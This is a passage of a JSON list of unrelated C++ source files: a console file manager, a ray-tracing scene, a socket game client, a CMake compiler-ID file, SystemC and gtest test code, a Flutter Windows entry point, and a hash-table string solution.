\"3. Delete file or directory\\n\";\n        std::cout << \"4. Exit\\n\";\n        std::cout << \"Enter your choice: \";\n        std::cin >> choice;\n\n        switch (choice) {\n            case '1':\n                listDirectory(path);\n                break;\n            case '2':\n                std::cout << \"Enter directory name to create: \";\n                std::cin >> path;\n                createDirectory(path);\n                break;\n            case '3':\n                std::cout << \"Enter file or directory name to delete: \";\n                std::cin >> path;\n                deleteFileOrDirectory(path);\n                break;\n            case '4':\n                std::cout << \"Exiting program.\\n\";\n                break;\n            default:\n                std::cerr << \"Error: Invalid choice.\\n\";\n        }\n    } while (choice != '4');\n\n    return 0;\n}\n",
    "#include \"Config.h\"\n#include \"Test.h\"\n#include \"Maths.h\"\n#include <algorithm>\n#if CPU_CAN_DO_THREADS\n#include \"enkiTS/TaskScheduler_c.h\"\n#include <thread>\n#endif\n#include <atomic>\n\n#include \"../../../public/tracy/Tracy.hpp\"\n\n// 46 spheres (2 emissive) when enabled; 9 spheres (1 emissive) when disabled\n#define DO_BIG_SCENE 1\n\nstatic Sphere s_Spheres[] =\n{\n    {float3(0,-100.5,-1), 100},\n    {float3(2,0,-1), 0.5f},\n    {float3(0,0,-1), 0.5f},\n    {float3(-2,0,-1), 0.5f},\n    {float3(2,0,1), 0.5f},\n    {float3(0,0,1), 0.5f},\n    {float3(-2,0,1), 0.5f},\n    {float3(0.5f,1,0.5f), 0.5f},\n    {float3(-1.5f,1.5f,0.f), 0.3f},\n#if DO_BIG_SCENE\n    {float3(4,0,-3), 0.5f}, {float3(3,0,-3), 0.5f}, {float3(2,0,-3), 0.5f}, {float3(1,0,-3), 0.5f}, {float3(0,0,-3), 0.5f}, {float3(-1,0,-3), 0.5f}, {float3(-2,0,-3), 0.5f}, {float3(-3,0,-3), 0.5f}, {float3(-4,0,-3), 0.5f},\n    {float3(4,0,-4), 0.5f}, {float3(3,0,-4), 0.5f}, {float3(2,0,-4), 0.5f}, {float3(1,0,-4), 0.5f}, {float3(0,0,-4), 0.5f}, {float3(-1,0,-4), 0.5f}, {float3(-2,0,-4), 0.5f}, {float3(-3,0,-4), 0.5f}, {float3(-4,0,-4), 0.5f},\n    {float3(4,0,-5), 0.5f}, {float3(3,0,-5), 0.5f}, {float3(2,0,-5), 0.5f}, {float3(1,0,-5), 0.5f}, {float3(0,0,-5), 0.5f}, {float3(-1,0,-5), 0.5f}, {float3(-2,0,-5), 0.5f}, {float3(-3,0,-5), 0.5f}, {float3(-4,0,-5), 0.5f},\n    {float3(4,0,-6), 0.5f}, {float3(3,0,-6), 0.5f}, {float3(2,0,-6), 0.5f}, {float3(1,0,-6), 0.5f}, {float3(0,0,-6), 0.5f}, {float3(-1,0,-6), 0.5f}, {float3(-2,0,-6), 0.5f}, {float3(-3,0,-6), 0.5f}, {float3(-4,0,-6), 0.5f},\n    {float3(1.5f,1.5f,-2), 0.3f},\n#endif // #if DO_BIG_SCENE\n};\nconst int kSphereCount = sizeof(s_Spheres) / sizeof(s_Spheres[0]);\n\nstatic SpheresSoA s_SpheresSoA(kSphereCount);\n\nstruct Material\n{\n    enum Type { Lambert, Metal, Dielectric };\n    Type type;\n    float3 albedo;\n    float3 emissive;\n    float roughness;\n    float ri;\n};\n\nstatic Material s_SphereMats[kSphereCount] =\n{\n    { Material::Lambert, float3(0.8f, 0.8f, 0.8f), float3(0,0,0), 0, 0, },\n    { Material::Lambert, float3(0.8f, 0.4f, 0.4f), float3(0,0,0), 0, 0, },\n    { Material::Lambert, float3(0.4f, 0.8f, 0.4f), float3(0,0,0), 0, 0, },\n    { Material::Metal, float3(0.4f, 0.4f, 0.8f), float3(0,0,0), 0, 0 },\n    { Material::Metal, float3(0.4f, 0.8f, 0.4f), float3(0,0,0), 0, 0 },\n    { Material::Metal, float3(0.4f, 0.8f, 0.4f), float3(0,0,0), 0.2f, 0 },\n    { Material::Metal, float3(0.4f, 0.8f, 0.4f), float3(0,0,0), 0.6f, 0 },\n    { Material::Dielectric, float3(0.4f, 0.4f, 0.4f), float3(0,0,0), 0, 1.5f },\n    { Material::Lambert, float3(0.8f, 0.6f, 0.2f), float3(30,25,15), 0, 0 },\n#if DO_BIG_SCENE\n    { Material::Lambert, float3(0.1f, 0.1f, 0.1f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.2f, 0.2f, 0.2f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.3f, 0.3f, 0.3f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.4f, 0.4f, 0.4f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.5f, 0.5f, 0.5f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.6f, 0.6f, 0.6f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.7f, 0.7f, 0.7f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.8f, 0.8f, 0.8f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.9f, 0.9f, 0.9f), float3(0,0,0), 0, 0, },\n    { Material::Metal, float3(0.1f, 0.1f, 0.1f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.2f, 0.2f, 0.2f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.3f, 0.3f, 0.3f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.4f, 0.4f, 0.4f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.5f, 0.5f, 0.5f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.6f, 0.6f, 0.6f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.7f, 0.7f, 0.7f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.8f, 0.8f, 0.8f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.9f, 0.9f, 0.9f), float3(0,0,0), 0, 0, },\n    { Material::Metal, float3(0.8f, 0.1f, 0.1f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.8f, 0.5f, 0.1f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.8f, 0.8f, 0.1f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.4f, 0.8f, 0.1f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.1f, 0.8f, 0.1f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.1f, 0.8f, 0.5f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.1f, 0.8f, 0.8f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.1f, 0.1f, 0.8f), float3(0,0,0), 0, 0, }, { Material::Metal, float3(0.5f, 0.1f, 0.8f), float3(0,0,0), 0, 0, },\n    { Material::Lambert, float3(0.8f, 0.1f, 0.1f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.8f, 0.5f, 0.1f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.8f, 0.8f, 0.1f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.4f, 0.8f, 0.1f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.1f, 0.8f, 0.1f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.1f, 0.8f, 0.5f), float3(0,0,0), 0, 0, }, { Material::Lambert, float3(0.1f, 0.8f, 0.8f), float3(0,0,0), ",
    "#include <iostream>\n#include <cstring>\n#include <arpa/inet.h>\n#include <unistd.h>\n#include <poll.h>\n\n#define BUFFER_SIZE 1024\n\nusing namespace std;\n\nvoid displayBoard(const string& boardStr) {\n    cout << boardStr;\n}\n\nint main(int argc, char **argv) {\n    if (argc != 3) {\n        cerr << \"Usage: \" << argv[0] << \" <server_ip> <server_port>\" << endl;\n        return 1;\n    }\n\n    const char* server_ip = argv[1];\n    int server_port = atoi(argv[2]);\n\n    int sock = socket(AF_INET, SOCK_STREAM, 0);\n    if (sock < 0) {\n        cerr << \"Error creating socket\" << endl;\n        return 1;\n    }\n\n    sockaddr_in server_addr;\n    server_addr.sin_family = AF_INET;\n    server_addr.sin_port = htons(server_port); // Puerto del servidor\n\n    if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {\n        cerr << \"Invalid address/ Address not supported\" << endl;\n        return 1;\n    }\n\n    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {\n        cerr << \"Connection failed\" << endl;\n        return 1;\n    }\n\n    struct pollfd fds[2];\n    fds[0].fd = sock;\n    fds[0].events = POLLIN;\n    fds[1].fd = fileno(stdin);\n    fds[1].events = POLLIN;\n\n    char buffer[BUFFER_SIZE]; // Buffer para recibir mensajes del servidor\n    while (true) {\n        int poll_count = poll(fds, 2, -1);\n        if (poll_count < 0) {\n            cerr << \"Poll error\" << endl;\n            break;\n        }\n\n        if (fds[0].revents & POLLIN) {\n            int n_bytes = recv(sock, buffer, BUFFER_SIZE - 1, 0);\n            if (n_bytes <= 0) {\n                cout << \"Server closed connection or error occurred\" << endl;\n                break;\n            }\n            buffer[n_bytes] = '\\0'; \n            string response(buffer);\n            displayBoard(response); // Mostrar el tablero del juego\n\n            if (response.find(\"Game Over\") != string::npos) {\n                break;\n            }\n        }\n\n        if (fds[1].revents & POLLIN) {\n            string input;\n            getline(cin, input);\n            send(sock, input.c_str(), input.length(), 0); // Enviar la entrada del usuario al servidor\n\n            if (input == \"Q\") {\n                break;\n            }\n        }\n    }\n\n    close(sock);\n    return 0;\n}\n",
    "/* This source file must have a .cpp extension so that all C++ compilers\r\n   recognize the extension without flags.  Borland does not know .cxx for\r\n   example.  */\r\n#ifndef __cplusplus\r\n# error \"A C compiler has been selected for C++.\"\r\n#endif\r\n\r\n#if !defined(__has_include)\r\n/* If the compiler does not have __has_include, pretend the answer is\r\n   always no.  */\r\n#  define __has_include(x) 0\r\n#endif\r\n\r\n\r\n/* Version number components: V=Version, R=Revision, P=Patch\r\n   Version date components:   YYYY=Year, MM=Month,   DD=Day  */\r\n\r\n#if defined(__COMO__)\r\n# define COMPILER_ID \"Comeau\"\r\n  /* __COMO_VERSION__ = VRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__COMO_VERSION__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC(__COMO_VERSION__ % 100)\r\n\r\n#elif defined(__INTEL_COMPILER) || defined(__ICC)\r\n# define COMPILER_ID \"Intel\"\r\n# if defined(_MSC_VER)\r\n#  define SIMULATE_ID \"MSVC\"\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_ID \"GNU\"\r\n# endif\r\n  /* __INTEL_COMPILER = VRP prior to 2021, and then VVVV for 2021 and later,\r\n     except that a few beta releases use the old format with V=2021.  */\r\n# if __INTEL_COMPILER < 2021 || __INTEL_COMPILER == 202110 || __INTEL_COMPILER == 202111\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER/100)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER/10 % 10)\r\n#  if defined(__INTEL_COMPILER_UPDATE)\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER_UPDATE)\r\n#  else\r\n#   define COMPILER_VERSION_PATCH DEC(__INTEL_COMPILER   % 10)\r\n#  endif\r\n# else\r\n#  define COMPILER_VERSION_MAJOR DEC(__INTEL_COMPILER)\r\n#  define COMPILER_VERSION_MINOR DEC(__INTEL_COMPILER_UPDATE)\r\n   /* The third version component from --version is an update index,\r\n      but no macro is provided for it.  */\r\n#  define COMPILER_VERSION_PATCH DEC(0)\r\n# endif\r\n# if defined(__INTEL_COMPILER_BUILD_DATE)\r\n   /* __INTEL_COMPILER_BUILD_DATE = YYYYMMDD */\r\n#  define COMPILER_VERSION_TWEAK DEC(__INTEL_COMPILER_BUILD_DATE)\r\n# endif\r\n# if defined(_MSC_VER)\r\n   /* _MSC_VER = VVRR */\r\n#  define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n#  define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n# endif\r\n# if defined(__GNUC__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n# elif defined(__GNUG__)\r\n#  define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n# endif\r\n# if defined(__GNUC_MINOR__)\r\n#  define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n# endif\r\n# if defined(__GNUC_PATCHLEVEL__)\r\n#  define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif (defined(__clang__) && defined(__INTEL_CLANG_COMPILER)) || defined(__INTEL_LLVM_COMPILER)\r\n# define COMPILER_ID \"IntelLLVM\"\r\n#if defined(_MSC_VER)\r\n# define SIMULATE_ID \"MSVC\"\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_ID \"GNU\"\r\n#endif\r\n/* __INTEL_LLVM_COMPILER = VVVVRP prior to 2021.2.0, VVVVRRPP for 2021.2.0 and\r\n * later.  Look for 6 digit vs. 8 digit version number to decide encoding.\r\n * VVVV is no smaller than the current year when a version is released.\r\n */\r\n#if __INTEL_LLVM_COMPILER < 1000000L\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/100)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/10 % 10)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER    % 10)\r\n#else\r\n# define COMPILER_VERSION_MAJOR DEC(__INTEL_LLVM_COMPILER/10000)\r\n# define COMPILER_VERSION_MINOR DEC(__INTEL_LLVM_COMPILER/100 % 100)\r\n# define COMPILER_VERSION_PATCH DEC(__INTEL_LLVM_COMPILER     % 100)\r\n#endif\r\n#if defined(_MSC_VER)\r\n  /* _MSC_VER = VVRR */\r\n# define SIMULATE_VERSION_MAJOR DEC(_MSC_VER / 100)\r\n# define SIMULATE_VERSION_MINOR DEC(_MSC_VER % 100)\r\n#endif\r\n#if defined(__GNUC__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUC__)\r\n#elif defined(__GNUG__)\r\n# define SIMULATE_VERSION_MAJOR DEC(__GNUG__)\r\n#endif\r\n#if defined(__GNUC_MINOR__)\r\n# define SIMULATE_VERSION_MINOR DEC(__GNUC_MINOR__)\r\n#endif\r\n#if defined(__GNUC_PATCHLEVEL__)\r\n# define SIMULATE_VERSION_PATCH DEC(__GNUC_PATCHLEVEL__)\r\n#endif\r\n\r\n#elif defined(__PATHCC__)\r\n# define COMPILER_ID \"PathScale\"\r\n# define COMPILER_VERSION_MAJOR DEC(__PATHCC__)\r\n# define COMPILER_VERSION_MINOR DEC(__PATHCC_MINOR__)\r\n# if defined(__PATHCC_PATCHLEVEL__)\r\n#  define COMPILER_VERSION_PATCH DEC(__PATHCC_PATCHLEVEL__)\r\n# endif\r\n\r\n#elif defined(__BORLANDC__) && defined(__CODEGEARC_VERSION__)\r\n# define COMPILER_ID \"Embarcadero\"\r\n# define COMPILER_VERSION_MAJOR HEX(__CODEGEARC_VERSION__>>24 & 0x00FF)\r\n# define COMPILER_VERSION_MINOR HEX(__CODEGEARC_VERSION__>>16 & 0x00FF)\r\n# define COMPILER_VERSION_PATCH DEC(__CODEGEARC_VERSION__     & 0xFFFF)\r\n\r\n#elif defined(__BORLANDC__)\r\n# define COMPILER_ID \"Borland\"\r\n  /* __BORLANDC__ = 0xVRR */\r\n# define COMPILER_VERSION_MAJOR HEX(__BORLANDC__>>8)\r\n# define COMPILER_VERSION_MINOR HEX(__BORLANDC__ & 0xFF)\r\n\r\n#elif defined(__WATCOMC__) && __WATCOMC__ < 1200\r\n# define COMPILER_ID \"Watcom\"\r\n   /* __WATCOMC__ = VVRR */\r\n# define COMPILER_VERSION_MAJOR DEC(__WATCOMC__ / 100)\r\n# define COMPILER_VERSION_MINOR DEC((__WATCOMC__ / 10) % 10)\r\n# if (__WATCOMC__ % 10) > 0\r\n#  define C",
    "/*****************************************************************************\n\n  Licensed to Accellera Systems Initiative Inc. (Accellera) under one or\n  more contributor license agreements.  See the NOTICE file distributed\n  with this work for additional information regarding copyright ownership.\n  Accellera licenses this file to you under the Apache License, Version 2.0\n  (the \"License\"); you may not use this file except in compliance with the\n  License.  You may obtain a copy of the License at\n\n    http://www.apache.org/licenses/LICENSE-2.0\n\n  Unless required by applicable law or agreed to in writing, software\n  distributed under the License is distributed on an \"AS IS\" BASIS,\n  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or\n  implied.  See the License for the specific language governing\n  permissions and limitations under the License.\n\n *****************************************************************************/\n\n// sc_writer_policy.cpp -- test for \n//\n//  Original Author: John Aynsley, Doulos, Inc.\n//\n// MODIFICATION LOG - modifiers, enter your name, affiliation, date and\n//\n// $Log: sc_writer_policy.cpp,v $\n// Revision 1.2  2011/05/08 19:18:46  acg\n//  Andy Goodrich: remove extraneous + prefixes from git diff.\n//\n\n// sc_writer_policy template argument of class sc_signal\n\n#define SC_INCLUDE_DYNAMIC_PROCESSES\n#include <systemc>\n\nusing namespace sc_core;\nusing namespace sc_dt;\nusing std::cout;\nusing std::endl;\nusing std::string;\n\n\nstruct M: sc_module\n{\n  sc_inout<bool> port;\n  \n  sc_time delay;\n  sc_signal<int>                  one_sig;\n  sc_signal<int, SC_MANY_WRITERS> many_sig;\n  \n  bool first_run;\n  int g0, g1, g2, g3;\n  \n  M(sc_module_name _name, sc_time _delay)\n  : port(\"port\")\n  , delay(_delay)\n  , first_run(true)\n  {\n    sc_assert( one_sig.get_writer_policy() == SC_ONE_WRITER );\n    sc_assert( many_sig.get_writer_policy() == SC_MANY_WRITERS );\n\n    SC_THREAD(T);\n    SC_METHOD(method_process_1);\n    SC_METHOD(method_process_2);\n\n    one_sig.write(-1);\n    many_sig.write(-1);\n    \n    g0 = g1 = g2 = g3 = 0;\n  }\n  \n  void end_of_elaboration()\n  {\n    sc_assert( port->get_writer_policy() == SC_MANY_WRITERS );\n    one_sig.write(1);\n    many_sig.write(1);\n    g0 = 1;\n  }\n  \n  void start_of_simulation()\n  {\n    one_sig.write(2);\n    many_sig.write(2);\n    g1 = 1;\n  }\n  \n  void T()\n  {\n    wait(delay);\n    port.write(true);\n    g2 = 1;\n  }\n  \n  void method_process_1()\n  {\n    one_sig.write(3);\n    many_sig.write(3);\n  }\n  \n  void method_process_2()\n  {\n    if (first_run)\n    {\n      first_run = false;\n      next_trigger(SC_ZERO_TIME);\n    }\n    else\n    {\n      try {\n        one_sig = 4;\n      }\n      catch (const std::exception& e) {\n        g3 = 1;\n      }\n      many_sig.write(4);\n    }\n  }\n  \n  SC_HAS_PROCESS(M);\n};\n\nstruct Top: sc_module\n{\n  M *m1;\n  M *m2;\n  \n  sc_signal<bool,SC_MANY_WRITERS> many_sig_1;\n  sc_signal<int,SC_MANY_WRITERS>  many_sig_2;\n  sc_signal<int,SC_ONE_WRITER>    one_sig_1;\n  sc_signal<int>                  one_sig_2;\n  \n  sc_buffer<sc_logic, SC_MANY_WRITERS> buffy;\n  \n  sc_signal_resolved              resolved;\n  sc_signal_rv<2>                 rv; \n    \n  Top(sc_module_name _name)\n  : many_sig_1(\"many_sig_1\")\n  , many_sig_2(\"many_sig_2\")\n  , one_sig_1(\"one_sig_1\")\n  , buffy(\"buffy\")\n  , resolved(\"resolved\")\n  , rv(\"rv\")\n  {\n    m1 = new M(\"m1\", sc_time(1, SC_PS));\n    m2 = new M(\"m2\", sc_time(2, SC_PS));\n    \n    m1->port.bind(many_sig_1);\n    m2->port.bind(many_sig_1);\n    \n    SC_THREAD(T1);\n    SC_THREAD(T2);\n    sc_spawn(sc_bind(&Top::T3, this));\n    \n    sc_assert( many_sig_1.get_writer_policy() == SC_MANY_WRITERS );\n    sc_assert( many_sig_2.get_writer_policy() == SC_MANY_WRITERS );\n    sc_assert( one_sig_1 .get_writer_policy() == SC_ONE_WRITER );\n    sc_assert( one_sig_2 .get_writer_policy() == SC_ONE_WRITER );\n    sc_assert( buffy     .get_writer_policy() == SC_MANY_WRITERS );\n    sc_assert( resolved  .get_writer_policy() == SC_MANY_WRITERS );\n    sc_assert( rv        .get_writer_policy() == SC_MANY_WRITERS );\n    \n    one_sig_1 = 0;\n    buffy = SC_LOGIC_X;\n    resolved = SC_LOGIC_Z;\n    rv = sc_lv<2>(\"ZZ\");\n    \n    // Writes outside of a process should not count as manyple writers\n    many_sig_1.write(true);\n    many_sig_2.write(0);\n    one_sig_1.write(0);\n    one_sig_2.write(0);\n    buffy.write(SC_LOGIC_0);\n    \n    f0 = f1 = f2 = f3 = f4 = f5 = 0;\n\n  }\n  \n  int f0, f1, f2, f3, f4, f5;\n\n  void T1()\n  { \n    resolved = SC_LOGIC_0;\n    rv = sc_lv<2>(\"01\");\n    \n    // Attempt to write SC_ONE_WRITER signal from >1 process should fail\n    try {\n      one_sig_1 = 1;\n    }\n    catch (const std::exception& e) {\n      f3 = 1;\n    }\n    \n    try {\n      one_sig_2 = 1;\n    }\n    catch (const std::exception& e) {\n      f4 = 1;\n    }\n    wait(1, SC_PS);\n\n    // Attempt to write SC_MANY_WRITER signal from >1 process IN SAME DELTA should fail\n    try {\n      many_sig_2.write(3);\n    }\n    catch (const std::exception& e) {\n      f5 = 1;\n    }\n    wait(3, SC_PS);\n",
    "#include \"gtest/gtest.h\"\n\n#include <iostream>\n#include \"smart_list/smart_list.h\"\n\nTEST(simple, simple)\n{\n    smart_list<int> test_l;\n\n    smart_list_handle<int> first_l = test_l.new_instance(17);\n    smart_list_handle<int> second_l = test_l.new_instance(25);\n\n    EXPECT_EQ(17, first_l.get());\n    EXPECT_EQ(25, second_l.get());\n    EXPECT_EQ(0u, first_l.handle());\n    EXPECT_EQ(1u, second_l.handle());\n    EXPECT_TRUE(first_l.is_valid());\n    EXPECT_TRUE(second_l.is_valid());\n\n    test_l.for_each([](int const &i) {\n        std::cout<<i<<std::endl;\n    });\n    std::cout<<std::endl;\n\n    test_l.free_instance(second_l);\n\n    test_l.for_each([](int const &i) {\n        std::cout<<i<<std::endl;\n    });\n    std::cout<<std::endl;\n\n\n    smart_list_handle<int> third_l = test_l.new_instance(2);\n\n    EXPECT_EQ(17, first_l.get());\n    EXPECT_EQ(2, third_l.get());\n    EXPECT_EQ(0u, first_l.handle());\n    EXPECT_EQ(1u, third_l.handle());\n    EXPECT_TRUE(first_l.is_valid());\n    EXPECT_FALSE(second_l.is_valid());\n\n    test_l.for_each([](int const &i) {\n        std::cout<<i<<std::endl;\n    });\n}\n\nstruct TestCopy\n{\n    static size_t move;\n    static size_t copy;\n    static size_t assignation;\n    static size_t creation;\n    static size_t destruction;\n\n    TestCopy() { ++creation; }\n    TestCopy(int val_p) : val(val_p) { ++creation; }\n    ~TestCopy() { ++destruction; }\n    TestCopy(const TestCopy &other_p) : val(other_p.val)\n    {\n        ++copy;\n    }\n    TestCopy(TestCopy &&other_p) : val(other_p.val)\n    {\n        ++move;\n    }\n    TestCopy& operator=(const TestCopy &other_p)\n    {\n        val = other_p.val;\n        ++assignation;\n        return *this;\n    }\n\n\n    int val = 0;\n\n};\n\nsize_t TestCopy::assignation = 0;\nsize_t TestCopy::move = 0;\nsize_t TestCopy::copy = 0;\nsize_t TestCopy::creation = 0;\nsize_t TestCopy::destruction = 0;\n\nvoid display()\n{\n    std::cout<<\" creation = \"<<TestCopy::creation<<std::endl;\n    std::cout<<\" copy = \"<<TestCopy::copy<<std::endl;\n    std::cout<<\" move = \"<<TestCopy::move<<std::endl;\n    std::cout<<\" destruction = \"<<TestCopy::destruction<<std::endl;\n    std::cout<<std::endl;\n}\n\nTEST(simple, copy)\n{\n    {\n        smart_list<TestCopy> test_l;\n\n        smart_list_handle<TestCopy> first_l = test_l.new_instance({17});\n        display();\n        smart_list_handle<TestCopy> second_l = test_l.new_instance({2});\n        display();\n        smart_list_handle<TestCopy> third_l = test_l.new_instance({25});\n        display();\n\n        test_l.free_instance(first_l);\n        test_l.free_instance(second_l);\n        test_l.free_instance(third_l);\n\n        display();\n\n        first_l = test_l.new_instance({11});\n        second_l = test_l.new_instance({12});\n        third_l = test_l.new_instance({13});\n\n        display();\n    }\n\n    display();\n}\n\nTEST(simple, recycle)\n{\n    smart_list<int> test_l;\n\n    smart_list_handle<int> first_l = test_l.new_instance(17);\n    smart_list_handle<int> second_l = test_l.new_instance(25);\n\n    EXPECT_EQ(17, first_l.get());\n    EXPECT_EQ(25, second_l.get());\n    EXPECT_EQ(0u, first_l.handle());\n    EXPECT_EQ(1u, second_l.handle());\n    EXPECT_TRUE(first_l.is_valid());\n    EXPECT_TRUE(second_l.is_valid());\n\n\ttest_l.free_instance(second_l);\n    EXPECT_FALSE(second_l.is_valid());\n\n\tsmart_list_handle<int> third_l = test_l.recycle_instance();\n    EXPECT_FALSE(second_l.is_valid());\n    EXPECT_TRUE(third_l.is_valid());\n\n    EXPECT_EQ(1u, third_l.handle());\n    EXPECT_EQ(1u, third_l.revision());\n    EXPECT_EQ(25, third_l.get());\n\n\tthird_l.get() = 12;\n    EXPECT_EQ(12, third_l.get());\n    EXPECT_EQ(12, test_l.get(1));\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"realstate\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <string>\n#include <iostream>\nusing namespace std;\n\nclass Nodo {\npublic:\n    int clave;\n    int valor;\n    Nodo* siguiente;\n};\n\nclass Lista {\npublic:\n    Nodo* cabeza;\n    Lista() : cabeza(nullptr) {}\n\n    void insertar(int clave, int valor) {\n        Nodo* nuevoNodo = new Nodo();\n        nuevoNodo->clave = clave;\n        nuevoNodo->valor = valor;\n        nuevoNodo->siguiente = cabeza;\n        cabeza = nuevoNodo;\n    }\n\n    void eliminar(int clave) {\n        if (cabeza == nullptr) return;\n        if (cabeza->clave == clave) {\n            Nodo* temp = cabeza;\n            cabeza = cabeza->siguiente;\n            delete temp;\n            return;\n        }\n        Nodo* actual = cabeza;\n        while (actual->siguiente != nullptr) {\n            if (actual->siguiente->clave == clave) {\n                Nodo* temp = actual->siguiente;\n                actual->siguiente = actual->siguiente->siguiente;\n                delete temp;\n                return;\n            }\n            actual = actual->siguiente;\n        }\n    }\n\n    Nodo* buscar(int clave) {\n        Nodo* actual = cabeza;\n        while (actual) {\n            if (actual->clave == clave) {\n                return actual;\n            }\n            actual = actual->siguiente;\n        }\n        return nullptr;\n    }\n};\n\nclass TablaHash {\npublic:\n    int tamano;\n    Lista** tabla;\n\n    TablaHash(int tamano) : tamano(tamano) {\n        tabla = new Lista*[tamano];\n        for (int i = 0; i < tamano; i++) {\n            tabla[i] = new Lista();\n        }\n    }\n\n    int funcionHash(int clave) {\n        return clave % tamano;\n    }\n\n    void insertar(int clave, int valor) {\n        int indice = funcionHash(clave);\n        tabla[indice]->insertar(clave, valor);\n    }\n\n    void eliminar(int clave) {\n        int indice = funcionHash(clave);\n        tabla[indice]->eliminar(clave);\n    }\n\n    void actualizar(int clave, int nuevoValor) {\n        int indice = funcionHash(clave);\n        Nodo* nodo = tabla[indice]->buscar(clave);\n        if (nodo) {\n            nodo->valor = nuevoValor;\n        }\n    }\n\n    int obtenerValor(int clave) {\n        int indice = funcionHash(clave);\n        Nodo* nodo = tabla[indice]->buscar(clave);\n        if (nodo) {\n            return nodo->valor;\n        }\n        return -1; // Devuelve -1 si la clave no se encuentra en la tabla hash\n    }\n\n};\n\nclass Solution {\npublic:\n    string minimizeStringValue(string s) {\n        TablaHash letras(30); // el constructor recibe el tama\u00f1o de la tabla, lo defino en 30 porque hay 27 letras en el alfabeto ingles y el signo de interrogacion. Es un tamanho extra por si acaso\n        int costo_total = 0;\n        string result = \"\";\n\n        for (auto l : s) {\n            \n            int costo_actual;\n            int letra_ascci = int(l);\n            cout << letra_ascci << endl;\n\n\n            if (letra_ascci == 63) { //si es un signo de interrogacion\n                for (int i = 97; i <= 122; i++) {\n                    if (letras.obtenerValor(i) == -1) {\n                        letra_ascci = i;\n                        break;\n                    }\n                }\n            } \n\n            if (letras.obtenerValor(letra_ascci) == -1) {\n                letras.insertar(letra_ascci, 0);\n            } \n            else {\n                letras.actualizar(letra_ascci, letras.obtenerValor(letra_ascci + 1));\n            }\n\n            costo_actual = letras.obtenerValor(letra_ascci);\n            \n            result += char(letra_ascci);\n            costo_total += costo_actual;\n        }\n\n        return result;\n    }   \n};",
